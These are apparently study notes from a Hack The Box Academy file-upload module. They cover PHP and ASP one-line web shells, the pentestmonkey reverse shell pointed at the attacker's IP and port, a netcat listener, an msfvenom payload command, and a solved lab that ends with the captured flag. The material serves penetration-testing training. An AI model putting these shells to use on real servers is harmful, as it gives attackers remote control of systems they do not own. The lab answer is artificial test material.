The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.

---

## Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option forÂ `PHP`Â isÂ [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore,Â [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)Â provides a plethora of web shells for different frameworks and languages, which can be found in theÂ `/opt/useful/seclists/Web-Shells`Â directory inÂ `PwnBox`.

We can download any of these web shells for the language of our web application (`PHP`Â in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to uploadÂ `phpbash.php`Â fromÂ [phpbash](https://github.com/Arrexel/phpbash)Â to our web application, and then navigate to its link by clicking on the Download button:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg)

As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.

---

## Writing Custom Web Shell

Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.

For example, withÂ `PHP`Â web applications, we can use theÂ `system()`Â function that executes system commands and prints their output, and pass it theÂ `cmd`Â parameter withÂ `$_REQUEST['cmd']`, as follows:

Code:Â php

```php
<?php system($_REQUEST['cmd']); ?>
```

If we write the above script toÂ `shell.php`Â and upload it to our web application, we can execute system commands with theÂ `?cmd=`Â GET parameter (e.g.Â `?cmd=id`), as follows:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.

**Tip:**Â If we are using this custom web shell in a browser, it may be best to use source-view by clickingÂ `[CTRL+U]`, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

Web shells are not exclusive toÂ `PHP`, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. ForÂ `.NET`Â web applications, we can pass theÂ `cmd`Â parameter withÂ `request('cmd')`Â to theÂ `eval()`Â function, and it should also execute the command specified inÂ `?cmd=`Â and print its output, as follows:

```asp
<% eval request('cmd') %>
```

We can find various other web shells online, many of which can be easily memorized for web penetration testing purposes. It must be noted thatÂ `in certain cases, web shells may not work`. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g.Â `system()`), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.

---

## Reverse Shell

Finally, let's see how we can receive reverse shells through the vulnerable upload functionality. To do so, we should start by downloading a reverse shell script in the language of the web application. One reliable reverse shell forÂ `PHP`Â is theÂ [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)Â PHP reverse shell. Furthermore, the sameÂ [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)Â we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

Let's download one of the above reverse shell scripts, like theÂ [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), and then open it in a text editor to input ourÂ `IP`Â and listeningÂ `PORT`, which the script will connect to. For theÂ `pentestmonkey`Â script, we can modify linesÂ `49`Â andÂ `50`Â and input our machine's IP/PORT:


```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Next, we can start aÂ `netcat`Â listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:

```shell-session
smoothment@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we successfully received a connection back from the back-end server that hosts the vulnerable web application, which allows us to interact with it for further exploitation. The same concept can be used for other web frameworks and languages, with the only difference being the reverse shell script we use.

---

## Generating Custom Reverse Shell Scripts

Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previousÂ `system`Â function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.

This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools likeÂ `msfvenom`Â can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows forÂ `PHP`:

```shell-session
smoothment@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Once ourÂ `reverse.php`Â script is generated, we can once again start aÂ `netcat`Â listener on the port we specified above, upload theÂ `reverse.php`Â script and visit its link, and we should receive a reverse shell as well:

```shell-session
smoothment@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with theÂ `-p`Â flag and specify the output language with theÂ `-f`Â flag.

While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.


# Question
---

![Pasted image 20250206144627.png](../../../../IMAGES/Pasted%20image%2020250206144627.png)

We can upload a file with the following contents:

```php
<?php system($_GET['cmd']); ?>
```

This is a basic webshell, since the validation of uploaded files is none, we can upload this with no problem. 

The output is the following:

![Pasted image 20250206144813.png](../../../../IMAGES/Pasted%20image%2020250206144813.png)

We can execute commands in the back-end server, let's look around for a flag, it would be easier to fire up burp so let's do it:

If we use `ls+/`, we can see the following:

```
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

So, we can simply read the flag by doing:

```
cat+/flag.txt
```

```
HTB{g07_my_f1r57_w3b_5h3ll}
```

